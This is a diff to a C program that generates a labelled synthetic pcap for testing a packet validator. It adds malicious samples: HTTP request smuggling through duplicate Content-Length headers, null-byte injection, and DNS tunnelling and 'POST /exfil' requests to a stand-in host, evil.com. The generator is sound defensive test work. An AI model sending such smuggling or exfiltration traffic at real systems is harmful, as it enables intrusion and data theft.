@@ -6,7 +6,7 @@
 
 #define PCAP_OUT    "data/capture.pcap"
 #define GT_OUT      "data/ground_truth.txt"
-#define TOTAL 100   /* total packets to generate (40% legit, 60% malicious) */
+#define TOTAL 1000  /* total packets to generate (85% legit, 15% malicious) */
 
 /* Ethernet header (14 bytes) */
 typedef struct {
@@ -166,20 +166,64 @@ int main(void) {
         0x00,0x01, 0x00,0x01
     };
 
-    /* Malicious */
-    const char *http_on_dns  = "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n";
-    const char *bad_method   = "BADVERB / HTTP/1.1\r\nHost: example.com\r\n\r\n";
-    const char *no_host      = "GET / HTTP/1.1\r\nAccept: */*\r\n\r\n";
-    const char *no_version   = "GET / \r\nHost: example.com\r\n\r\n";
-    const char *post_on_dns  = "POST /exfil HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 0\r\n\r\n";
-    uint8_t trunc_dns[]      = { 0x00,0x03, 0x01,0x00 };
+    /* Malicious — obvious structural attacks */
+    const char *http_on_dns = "GET / HTTP/1.1\r\nHost: evil.com\r\n\r\n";
+    const char *post_on_dns = "POST /exfil HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 0\r\n\r\n";
+    const char *bad_method  = "BADVERB / HTTP/1.1\r\nHost: example.com\r\n\r\n";
+    const char *no_host     = "GET / HTTP/1.1\r\nAccept: */*\r\n\r\n";
+    const char *no_version  = "GET / \r\nHost: example.com\r\n\r\n";
+    uint8_t trunc_dns[]     = { 0x00,0x03, 0x01,0x00 };
+
+    /* Malicious — subtle attacks that pass basic structural checks */
+
+    /* HTTP/1.9 version spoof: valid method + Host, non-standard version */
+    const char *http_bad_version =
+        "GET / HTTP/1.9\r\nHost: example.com\r\n\r\n";
+
+    /* Request smuggling: duplicate Content-Length header */
+    const char *http_smuggle =
+        "POST /upload HTTP/1.1\r\nHost: example.com\r\n"
+        "Content-Length: 0\r\nContent-Length: 999\r\n\r\n";
+
+    /* Null byte injection: valid headers followed by null + binary data.
+       Built as a byte array because C strings truncate at '\0'. */
+    const char *http_null_prefix = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n";
+    uint8_t http_nullbyte[64];
+    uint16_t http_nullbyte_len;
+    {
+        uint16_t plen = (uint16_t)strlen(http_null_prefix);
+        memcpy(http_nullbyte, http_null_prefix, plen);
+        http_nullbyte[plen]     = 0x00;   /* null byte */
+        http_nullbyte[plen + 1] = 'E';    /* binary exfil marker */
+        http_nullbyte[plen + 2] = 'X';
+        http_nullbyte[plen + 3] = 'F';
+        http_nullbyte_len = plen + 4;
+    }
+
+    /* DNS tunneling: valid header + QDCOUNT=1, but 40-char base64 subdomain */
+    uint8_t dns_tunnel[] = {
+        0x00,0x10, 0x01,0x00, 0x00,0x01, 0x00,0x00, 0x00,0x00, 0x00,0x00,
+        /* 40-byte label — base64-looking exfil data */
+        40,'Y','W','J','j','Z','G','V','m','Z','2','h','p','a','m','t','s',
+           'b','W','5','v','c','H','F','y','c','3','R','1','d','n','d','4',
+           'e','X','o','x','M','j','M','0',
+        0x04,'e','v','i','l', 0x03,'c','o','m', 0x00,
+        0x00,0x01, 0x00,0x01
+    };
+
+    /* DNS response masquerading as query: QR bit (byte[2] & 0x80) = 1 */
+    uint8_t dns_response[] = {
+        0x00,0x05, 0x81,0x80, 0x00,0x01, 0x00,0x00, 0x00,0x00, 0x00,0x00,
+        0x07,'e','x','a','m','p','l','e', 0x03,'c','o','m', 0x00,
+        0x00,0x01, 0x00,0x01
+    };
 
     int legit_count = 0;
     int mal_count   = 0;
 
     for (int i = 0; i < TOTAL; i++) {
-        /* 40% legit (i%10 < 4), 60% malicious — interleaved */
-        if (i % 10 < 4) {
+        /* 85% legit (17 per 20), 15% malicious (3 per 20) — interleaved */
+        if (i % 20 < 17) {
             switch (legit_count % 10) {
                 case 0: flen = build_tcp_frame(frame, 80,  (uint8_t *)http_get,  (uint16_t)strlen(http_get));  break;
                 case 1: flen = build_tcp_frame(frame, 80,  (uint8_t *)http_post, (uint16_t)strlen(http_post)); break;
@@ -190,22 +234,26 @@ int main(void) {
                 case 6: flen = build_udp_frame(frame, 53,  dns_a, (uint16_t)sizeof(dns_a)); break;
                 case 7: flen = build_udp_frame(frame, 53,  dns_b, (uint16_t)sizeof(dns_b)); break;
                 case 8: flen = build_udp_frame(frame, 53,  dns_c, (uint16_t)sizeof(dns_c)); break;
-                case 9: flen = build_udp_frame(frame, 53,  dns_a, (uint16_t)sizeof(dns_a)); break;
+                default: flen = build_udp_frame(frame, 53, dns_a, (uint16_t)sizeof(dns_a)); break;
             }
             write_packet(dumper, gt, frame, flen, 0);
             legit_count++;
         } else {
-            switch (mal_count % 10) {
-                case 0: flen = build_udp_frame(frame, 53, (uint8_t *)http_on_dns,  (uint16_t)strlen(http_on_dns));  break;
-                case 1: flen = build_tcp_frame(frame, 80, dns_a, (uint16_t)sizeof(dns_a)); break;
-                case 2: flen = build_tcp_frame(frame, 80, (uint8_t *)bad_method,   (uint16_t)strlen(bad_method));   break;
-                case 3: flen = build_tcp_frame(frame, 80, (uint8_t *)no_host,      (uint16_t)strlen(no_host));      break;
-                case 4: flen = build_tcp_frame(frame, 80, (uint8_t *)"", 0); break;
-                case 5: flen = build_udp_frame(frame, 53, trunc_dns, (uint16_t)sizeof(trunc_dns)); break;
-                case 6: flen = build_udp_frame(frame, 53, (uint8_t *)post_on_dns,  (uint16_t)strlen(post_on_dns));  break;
-                case 7: flen = build_tcp_frame(frame, 80, (uint8_t *)no_version,   (uint16_t)strlen(no_version));   break;
-                case 8: flen = build_tcp_frame(frame, 80, dns_b, (uint16_t)sizeof(dns_b)); break;
-                case 9: flen = build_udp_frame(frame, 53, trunc_dns, (uint16_t)sizeof(trunc_dns)); break;
+            switch (mal_count % 12) {
+                /* Structural attacks — fail early in validator */
+                case 0:  flen = build_udp_frame(frame, 53, (uint8_t *)http_on_dns,  (uint16_t)strlen(http_on_dns));  break;
+                case 1:  flen = build_tcp_frame(frame, 80, dns_a,                   (uint16_t)sizeof(dns_a));         break;
+                case 2:  flen = build_tcp_frame(frame, 80, (uint8_t *)bad_method,   (uint16_t)strlen(bad_method));    break;
+                case 3:  flen = build_tcp_frame(frame, 80, (uint8_t *)no_host,      (uint16_t)strlen(no_host));       break;
+                case 4:  flen = build_tcp_frame(frame, 80, (uint8_t *)no_version,   (uint16_t)strlen(no_version));    break;
+                case 5:  flen = build_udp_frame(frame, 53, trunc_dns,               (uint16_t)sizeof(trunc_dns));     break;
+                case 6:  flen = build_udp_frame(frame, 53, (uint8_t *)post_on_dns,  (uint16_t)strlen(post_on_dns));   break;
+                /* Subtle attacks — pass basic checks, caught by deeper rules */
+                case 7:  flen = build_tcp_frame(frame, 80, (uint8_t *)http_bad_version, (uint16_t)strlen(http_bad_version)); break;
+                case 8:  flen = build_udp_frame(frame, 53, dns_tunnel,              (uint16_t)sizeof(dns_tunnel));    break;
+                case 9:  flen = build_udp_frame(frame, 53, dns_response,            (uint16_t)sizeof(dns_response));  break;
+                case 10: flen = build_tcp_frame(frame, 80, (uint8_t *)http_smuggle, (uint16_t)strlen(http_smuggle));  break;
+                default: flen = build_tcp_frame(frame, 80, http_nullbyte,           http_nullbyte_len);                break;
             }
             write_packet(dumper, gt, frame, flen, 1);
             mal_count++;
